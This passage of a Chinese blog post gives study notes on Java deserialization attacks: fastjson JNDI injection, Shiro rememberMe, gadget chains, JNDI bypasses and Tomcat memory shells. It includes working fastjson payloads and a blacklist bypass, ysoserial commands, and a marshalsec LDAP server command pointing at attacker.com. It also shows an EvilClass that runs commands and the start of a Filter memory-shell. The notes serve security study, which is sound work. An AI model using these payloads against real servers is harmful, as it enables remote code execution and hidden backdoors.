class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:31&#125;&quot;</span>;<br>        String userStr=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.kuang.fastjson.demos.web.User\&quot;,\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:21&#125;&quot;</span>;<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> JSON.parseObject(userStr);<br>        System.out.println(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>加入User类解析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">private</span> Integer age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行后发现传入其他类解析后默认执行get  set类方法</p></li><li><p>构造poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//触发fastjson反序列化用到JSON.parseObject,JSON.parse()</span><br><br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:31&#125;&quot;</span>;<br>        String userStr=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.kuang.fastjson.demos.web.User\&quot;,\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:21&#125;&quot;</span>;<br>        String poc=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://172.31.80.1:1389/fjfljn\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> JSON.parseObject(poc);<br>        System.out.println(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>成功弹出计算器！！！</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A132.png"></p></li><li><p>反序列化原理分析</p><ul><li><p>传入其他类解析时会调用  getdataSourceName，setdataSourceName，</p><pre><code class="hljs">                                         getautoCommit，setautoCommit方法</code></pre></li><li><p>调用setAutoCommit方法时调用了 connect方法，connect方法中调用了lookup()方法</p><p>控制注入核心触发代码</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A133.png"></p></li><li><p>分析过程</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A134.png"></p></li></ul></li></ul><h5 id="1-2-25版本"><a href="#1-2-25版本" class="headerlink" title="1.2.25版本"></a>1.2.25版本</h5><ul><li><p>发现原来的poc无法执行</p></li><li><p>定位到<code>checkAutoType()</code>方法，看一下它的逻辑：如果开启了<code>autoType</code>，那么就先判断类名在不在白名单中，如果在就用<code>TypeUtils.loadClass</code>加载，如果不在就去匹配黑名单：</p><p>jndi注入需要的类名在黑名单中，autoType默认关闭，无法使用原poc</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm7ZibH49F3GjQpYAic5fibnLPIPibNDVZ3Zq8iaeA6uxPbqOxqcd536j9ztw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1"></p></li><li><p>在demo controller中添加一行代码，开启AutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>在原poc包名前加上L，后面加;</p><p>即可弹出计算器</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A135.png"></p></li><li><p>发掘两步骤的原因</p><ul><li><p>前加L，后加；，用于绕过黑名单，后续有方法去除L与；</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A136.png"></p></li><li><p>开启autoType</p><p>断点调试后发现，如果不开启autoType，不会匹配白名单，会直接爆出autoType is not support</p><p>后续代码都全部显示异常</p></li></ul></li></ul><h5 id="1-2-25-1-2-47通杀poc"><a href="#1-2-25-1-2-47通杀poc" class="headerlink" title="1.2.25-1.2.47通杀poc"></a>1.2.25-1.2.47通杀poc</h5><ul><li><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;a&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="hljs-string">&quot;b&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1/exp&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;<br></code></pre></td></tr></table></figure></li><li><p>测试发现能正常弹出计算器</p></li><li><p>利用步骤</p><ul><li>利用java.lang.Class将恶意类加载到mappings中</li><li>从mappings中取出恶意代码并绕过黑名单进行反序列化</li></ul></li></ul><h3 id="Shiro反序列化"><a href="#Shiro反序列化" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h3><ul><li><p>shiro反序列化链分析(获取用户请求)</p><ul><li>获取cookie中rememberMe的值</li><li>对remember进行Base64解码</li><li>使用AES解密</li><li>对解密的值进行反序列化</li></ul><p>550：Shiro-550 漏洞主要是由于 Shiro 的 <em>rememberMe</em> 内容反序列化导致的命令执行漏洞。其原因是默认加密密钥硬编码在 Shiro 源码中，攻击者可以创建一个恶意对象，对其进行序列化、编码，然后将其作为 cookie 的 rememberMe 字段内容发送，Shiro 将对其解码和反序列化，导致服务器运行恶意代码。</p><p>721：Shiro-721 漏洞利用了 AES-128-CBC 加密模式的 Padding Oracle Attack。攻击者可以通过 Padding Oracle 加密生成的攻击代码来构造恶意的 rememberMe 字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行</p></li></ul><h4 id="漏洞环境搭建以及利用链分析"><a href="#漏洞环境搭建以及利用链分析" class="headerlink" title="漏洞环境搭建以及利用链分析"></a>漏洞环境搭建以及利用链分析</h4><h5 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h5><p><a href="https://www.cnblogs.com/nice0e3/p/14183173.html">Java安全之Shiro 550反序列化漏洞分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p><ul><li><p>给jstl加上版本为1.2</p></li><li><p>tomcat部署工件</p></li><li><p>访问url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1:8089/samples_web_war/login.jsp<br></code></pre></td></tr></table></figure></li><li><p>登录时抓取数据包</p></li><li><p>在返回包中找到cookie关键字为rememberMe</p></li><li><p>通过关键字爆破密钥并检测</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A137.png"></p></li><li><p>漏洞分析</p></li><li><p>在DefaultSecurityManager类的rememberMeSuccessfulLogin方法处下断点</p><p>目的：</p><ul><li>shiro登陆操作执行逻辑</li><li>反序列化漏洞的产生</li><li>利用条件</li></ul></li><li><p>追踪函数后发现</p><ul><li><p>加密：序列化-&gt;aes加密-&gt;base64加密-&gt;存入cookie</p></li><li><p>接受序列化数据解密</p><p>接受解密：base64解码-&gt;aes解密-&gt;反序列化</p></li></ul></li><li><p>调试时发现的AES加密密钥</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A138.png"></p><p>key数组可利用python脚本还原为原密钥字符串</p></li><li><p>shiro反序列化无法利用fastjson的利用链</p><ul><li><p>原因</p><ul><li><p>fastjson利用方法：调用JdbcRowSetImpl类，通过set，get方法触发lookup方法传参(反序列化自定义方法)，远程调用脚本</p></li><li><p>shiro反序列化：利用原生反序列化函数：readObject  writeObject  ObjectInputStream(漏洞点)</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A139.png"></p></li><li><p>shiro可能有JdbcRowSetImpl类，不满足触发set，get条件</p></li></ul></li></ul></li><li><p>利用工具使用利用链执行命令，成功弹出计算器</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A140.png"></p></li></ul><h4 id="cc利用链分析"><a href="#cc利用链分析" class="headerlink" title="cc利用链分析"></a>cc利用链分析</h4><ul><li><p>CC链，全称为CommonsCollections链，是指在Java反序列化漏洞中利用Apache Commons Collections库中的特定类和方法，构造出一条可以执行任意代码的调用链。CC链的核心在于利用反射机制，通过一系列的类和方法调用，最终达到执行恶意代码的目的。</p></li><li><p>攻击链的选取与框架加载的外部库有关，外部库中存在原生的漏洞</p></li><li><p>CB链分析：<a href="https://www.freebuf.com/articles/web/319397.html">关于我学渗透的那档子事之Java反序列化-CB链 - FreeBuf网络安全行业门户</a></p></li><li><p>知识要点</p><ul><li><p>入口点：触发反序列化的重写readObject方法</p></li><li><p>getProperty()方法</p><p>CB里面的类方法  对对象的一个方法进行调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//PropertyUtils.getProperty(new Person(),&quot;name&quot;);</span><br><span class="hljs-comment">//自动调用Person对象里面的getName方法</span><br>PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>(),<span class="hljs-string">&quot;outputProperties&quot;</span>)<br><span class="hljs-comment">//自动调用TemplatesImpl对象里面的getOutputProperties方法</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>漏洞复现及CB链分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将利用链分为三部分</span><br><br>TemplatesImpt类-&gt;调用恶意类<br><br>BeanComparator类-&gt;利用javabean调用getOutputProperties()<br><br>PriorityQueue类-&gt;反射调用PropertyUtils.getPropert<br></code></pre></td></tr></table></figure><ul><li><p>入口点</p><p>PriorityQueue #readObject -&gt; heapify() -&gt; siftDown -&gt; siftDownUsingComparator -&gt; comparator.compare</p><p>-&gt; BeanComparator.compare</p><p>BeanComparator.compare会执行PropertyUtils.getProperty</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o1, <span class="hljs-built_in">this</span>.property);<br><span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o2, <span class="hljs-built_in">this</span>.property);<br><br>o1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>()<br>property=outputProperties<br>会自动调用TemplatesImpl#getOutputProperties方法<br></code></pre></td></tr></table></figure><p>条件</p><ul><li>size &gt;&#x3D;2</li><li>comparator !&#x3D; null</li><li>property  !&#x3D;  null</li></ul><p>TemplatesImpl 链，属于CC链分析  RCE</p><p>-&gt;  TemplatesImpl #getOutputProperties</p><p>-&gt;  newTransformer()</p><p>-&gt;  TransformerImpl(getTransletInstance())</p><p>-&gt;  defineTransletClasses()</p><p>-&gt;  loader.defineClass(执行命令)</p><p>条件：</p><p>_name !&#x3D;null</p><p>_class   !&#x3D;null</p><p>_bytecodes !&#x3D; null (命令参数)</p></li></ul></li><li><p>loader.defineClass</p><p><code>ClassLoader.defineClass</code> 是 <code>ClassLoader</code> 的一个受保护方法，它允许将字节数组转换为 Java 类。攻击者可借助它加载任意恶意类（即“内存马”或包含命令执行的类）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = loader.defineClass(name, classBytes, <span class="hljs-number">0</span>, classBytes.length);<br></code></pre></td></tr></table></figure><p>这样，<code>classBytes</code> 中的字节码就会被定义为类并加载进 JVM，随之可能执行静态代码块或构造方法中携带的恶意逻辑。</p><p><code>defineClass</code> 本身不执行命令，它只是<strong>将字节码加载为类</strong>。真正执行命令的行为，通常发生在：</p><ul><li>类的<strong>静态代码块</strong>；</li><li>类的<strong>构造方法</strong>；</li><li>类的方法中，被随后立即调用。</li></ul><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一旦被加载（通过 <code>defineClass</code>），这个类的静态代码块就会立即执行，造成命令执行。</p></li><li><p>反序列化简化流程图</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">反序列化入口<br>     ↓<br>CC利用链触发（TemplatesImpl、InvokerTransformer 等）<br>     ↓<br>调用 defineClass(classBytes)<br>     ↓<br>加载恶意类<br>     ↓<br>静态块/构造器执行<br>     ↓<br>命令执行（如 Runtime.getRuntime().<span class="hljs-built_in">exec</span>）<br></code></pre></td></tr></table></figure></li><li><p>反序列化构造cc链能够命令执行的核心</p><ol><li><code>TemplatesImpl.getOutputProperties()</code> 会触发内部 <code>defineTransletClasses()</code>；</li><li>这个方法调用了 <code>defineClass()</code>，加载了我们注入的恶意类；</li><li>恶意类的 <strong>静态代码块</strong> 被立即执行 → <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>；</li></ol></li></ul><h3 id="JNDI注入及其高版本绕过"><a href="#JNDI注入及其高版本绕过" class="headerlink" title="JNDI注入及其高版本绕过"></a>JNDI注入及其高版本绕过</h3><p><a href="https://tttang.com/archive/1405/#toc_0x01-beanfactory">探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖 (tttang.com)</a></p><ul><li><p>JNDI注入触发的三个模式</p><ol><li>远程引用模式(基于JDK版本)</li><li>本地引用模式(基于依赖Jar)</li><li>反序列化模式(基于gadget链)</li></ol></li><li><p>jndi注入的版本限制</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A141.png"></p><p>高版本无法注入的原因：</p><ul><li><p>com.sun.jndi.rmi.object.trustURLCodebase，</p><p>com.sun.jndi.cosnaming.object.trustURLCodebase的默认值变为false，即不允许从远程的Codebase加载Reference工厂类，没限制加载本地文件</p></li></ul></li><li><p>高版本绕过方法</p><ul><li><p>利用jar包</p><p><a href="https://tttang.com/archive/1405/#toc_0x01-beanfactory">探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖 (tttang.com)</a></p><p>白盒审计时查看引入了什么依赖，根据引入的依赖利用本地jar包，进行jndi注入</p></li><li><p>利用反序列化链(同样需要依赖包)</p><p><a href="https://blog.csdn.net/mole_exp/article/details/121141042">JNDI注入利用原理及绕过高版本JDK限制_jndi注入的限制-CSDN博客</a></p><p><a href="https://www.cnblogs.com/bitterz/p/15946406.html#3-%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE%E6%B5%81%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce">java高版本下各种JNDI Bypass方法复现 - bitterz - 博客园 (cnblogs.com)</a></p><p>原理：</p><p>即使：</p><ul><li>远程类加载被禁用了（禁止 <code>http://...</code> 类加载）</li><li><code>trustURLCodebase=false</code></li></ul><p>只要 <strong>Java 会尝试读取对象并反序列化</strong>（如通过 <code>ObjectInputStream</code>），攻击者就可以在返回中嵌入<strong>序列化 Gadget 链对象</strong>，并在目标中激活它</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 <span class="hljs-string">&quot;calc&quot;</span> &gt; poc.txt<br><span class="hljs-built_in">cat</span> poc.txt|base64.txt(替换换行符)<br>ldap://127.0.0.1:6666/exp<br><br><span class="hljs-comment">#需要依赖包</span><br>&lt;groupId&gt;commoms-collections&lt;/groupId&gt;<br>&lt;artifactId&gt;commons-conllections&lt;/artfactId&gt;<br></code></pre></td></tr></table></figure><p>在 Java 8u191+ 等高版本中，虽然远程类加载被禁用了（<code>trustURLCodebase=false</code>），<strong>但如果目标系统中已经存在可用的 Gadget 链（利用链）类，就可能通过 JNDI 注入触发反序列化，从而执行任意命令</strong>。</p><p> 绕过思路：利用已有 Gadget 链</p><p> 条件</p><ol><li><strong>JNDI 注入点存在</strong>（如 Log4j、Tomcat 配置等）</li><li><strong>目标服务器已有可利用的类</strong>（如 commons-collections、Groovy、Spring 组件等）</li><li><strong>支持 LDAP 或 RMI 绑定 Object 实例</strong>（不是远程类加载，而是对象反序列化）</li></ol><p>绕过方式技术细节</p><p>1.使用 LDAP 服务返回 <strong>序列化对象（不是类引用）</strong></p><p>攻击者搭建恶意 LDAP 服务器，当目标发起 JNDI 查询时，返回一个已经构造好的 Java 序列化对象（Object），而不是远程类的 URL。</p><p> <strong>即不需要 trustURLCodebase &#x3D; true</strong>，而是利用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference → Referenceable → 特定 Gadget 链的序列化对象<br></code></pre></td></tr></table></figure><ol start="2"><li>构造 Gadget 链（利用 ysoserial 工具）</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections5 <span class="hljs-string">&#x27;calc&#x27;</span> &gt; payload.ser<br></code></pre></td></tr></table></figure><p>使用 <code>marshalsec</code> 项目中的 LDAPServer 模拟 LDAP 服务，返回这个对象。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec.jar marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://attacker.com/#Exploit&quot;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><ul><li><p>web代码执行流程</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A142.png"></p></li><li><p>servlet层触发的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//有请求必触发的方法</span><br>requestInitialized<br>requestDestroyed    <br></code></pre></td></tr></table></figure></li><li><p>内存马的类型</p><ol><li>Listener内存马：监听特定事件并执行恶意代码。</li><li>Filter内存马：拦截和修改HTTP请求和响应。</li><li>Servlet内存马：直接处理HTTP请求并执行恶意命令。</li></ol><p><img src="https://.3001.net//s/20221209/1670591008_63933220d0b7298b0fb3f.png!small"></p></li></ul><h4 id="Listen中内存马"><a href="#Listen中内存马" class="headerlink" title="Listen中内存马"></a>Listen中内存马</h4><ul><li><p>原理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">监听器指向class: com.example.listenshell.Test<br><br>applicationListeners=com.example.listenshell.Test<br>StanderContext#contxet-&gt;ApplicationContext#context<br><br>项目启动 listen在运行时  class来源是怎么获取的<br>StandardContext#addApplicationEventListener<br>内存:添加一个listen <br><br>Servlet -&gt; ApplicationContext -&gt; StandardContext<br></code></pre></td></tr></table></figure></li></ul><h4 id="Filter中内存马"><a href="#Filter中内存马" class="headerlink" title="Filter中内存马"></a>Filter中内存马</h4><ul><li><p>filter类中的方法</p><ul><li>init–初始化</li><li>doFilter – 执行点</li><li>destory –  销毁</li></ul></li><li><p>filter访问流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Servlet -&gt; context-&gt;ApplicationFilterConfig-&gt;context-&gt;StandardContext-&gt;filterConfigs<br><br>ApplicationFilterConfig#filterConfig context -&gt; StandardContext#<br><br>filterConfigs<br>filterDefs#  配置名称和class<br>filterMaps   配置名称url路由<br><br>ApplicationFilterConfig#filterConfig( filterDef(filterClass filterName))<br><br>addFilterDef  添加配置名称和class<br>addFilterMap  addFilterMapBefore  添加配置名称和url路由<br></code></pre></td></tr></table></figure></li><li><p>内存马实现</p><p>– 相当于添加一个Filter</p><ol><li>Servlet获取用户访问</li><li>判断触发(是否为null)</li><li>如未触发则添加Filter</li><li>向对象成员中添加配置信息</li></ol></li><li><p>Filter内存马编写</p><p><a href="https://zhuanlan.zhihu.com/p/404057893">【安全记录】通过jsp文件注入内存马 - 知乎 (zhihu.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> pres.test.momenshell;<br><br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><span class="hljs-keyword">import</span> 